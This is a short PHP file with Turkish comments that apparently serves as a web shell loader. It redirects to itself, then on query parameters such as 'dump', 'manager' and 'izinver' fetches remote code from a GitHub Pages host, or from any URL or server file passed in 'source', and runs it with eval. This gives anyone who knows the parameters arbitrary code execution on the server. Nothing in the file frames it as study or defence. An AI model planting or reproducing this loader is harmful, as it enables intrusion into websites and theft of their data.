<?php 

$phpFilePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', __FILE__);

// Parametre varsa, yönlendirme yapılmaması için kontrol
if (!empty($_SERVER['QUERY_STRING'])) {
    // Mevcut URL'yi al
    $currentUrl = $_SERVER['REQUEST_URI'];
    
    // Kendi dosya yolunu ve parametreyi birleştiriyoruz
    $newUrl = $phpFilePath . '?' . $_SERVER['QUERY_STRING'];
    
    // Yönlendirme döngüsünden kaçınmak için, mevcut URL'yi kontrol et
    if ($newUrl !== $currentUrl) {
        header("Location: $newUrl");
        exit();
    }
}

// Parametre listesi
$parameters = [
    'yess' => 'https://necessaryfor.github.io/all/yeah.txt',
    'dump' => 'https://necessaryfor.github.io/all/dump.txt',
    'manager' => 'https://necessaryfor.github.io/all/manager.txt',
    'izinver' => 'https://necessaryfor.github.io/all/izinver.txt',
    'info' => 'https://necessaryfor.github.io/all/info.txt'
];

// Belirli bir parametre var mı kontrol et
foreach ($parameters as $param => $defaultUrl) {
    if (isset($_GET[$param])) {
        $input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
        $fileContent = '';

        if (filter_var($input, FILTER_VALIDATE_URL)) {
            $fileContent = file_get_contents($input);
        } else {
            $filePath = $_SERVER['DOCUMENT_ROOT'] . '/' . ltrim($input, '/');
            if (file_exists($filePath)) {
                $fileContent = file_get_contents($filePath);
            }
        }

        if ($fileContent !== false) {
            // Çekilen içeriği çalıştırıyoruz
            eval('?>' . $fileContent);
        } else {
            echo "Dosya içeriği alınamadı.";
        }

        // İşlemi bitirdikten sonra döngüden çık
        exit();
    }
}

// Hiçbir parametre bulunamadıysa, uyarı mesajı göster
echo "URL içinde geçerli bir parametre bulunamadı.";

?>
